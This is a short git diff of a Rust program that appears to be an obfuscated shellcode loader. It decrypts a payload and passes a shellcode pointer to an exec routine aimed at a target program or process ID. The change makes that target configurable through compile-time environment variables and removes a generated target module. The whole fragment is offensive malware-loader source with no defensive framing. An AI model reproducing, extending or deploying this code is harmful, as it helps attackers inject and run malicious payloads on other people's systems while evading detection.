@@ -9,9 +9,6 @@ mod decrypt;
 mod alloc_mem;
 use load_payload::load_payload;
 
-#[cfg(any(feature = "pattern2", feature = "pattern3"))]
-mod target;
-
 use rustcrypt_ct_macros::obf_lit;
 use decrypt::decrypt;
 use exec::exec;
@@ -104,18 +101,18 @@ fn main() {
         
         #[cfg(feature = "pattern2")] 
         {
-            let target_program = String::from_utf8(target::TARGET_PROGRAM.clone()).unwrap();
-            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, &target_program) {
-                println!("{} {}", obf_lit!("Failed to execute:"), e);
+            let target_program = env!("RSL_TARGET_PROGRAM");
+            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, target_program) {
+                println!("{} {}", "Failed to execute:", e);
                 process::exit(1);
             }
         }
         
         #[cfg(feature = "pattern3")]
         {
-            let pid = target::TARGET_PID;
-            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, pid as usize) {
-                println!("{} {}", obf_lit!("Failed to execute:"), e);
+            let pid: usize = env!("RSL_TARGET_PID").parse().unwrap_or(0);
+            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, pid) {
+                println!("{} {}", "Failed to execute:", e);
                 process::exit(1);
             }
         }
